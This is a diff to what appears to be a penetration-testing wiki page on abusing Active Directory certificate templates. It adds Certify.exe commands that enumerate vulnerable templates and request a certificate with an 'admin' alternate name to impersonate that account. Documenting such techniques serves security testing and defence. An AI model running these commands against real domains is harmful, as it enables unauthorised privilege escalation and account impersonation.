@@ -33,7 +33,17 @@ By default, Certipy uses LDAPS, which is not always supported by the domain cont
 From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used.
 
 ```batch
+# Find vulnerable/abusable certificate templates using default low-privileged group
 Certify.exe find /vulnerable
+
+# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
+Certify.exe find /vulnerable /currentuser
+```
+
+Once a vulnerable template is found, a request shall be made to obtain a certificate.
+
+```batch
+Certify.exe request /template:"Vulnerable template" /altname:"admin"
 ```
 {% endtab %}
 {% endtabs %}
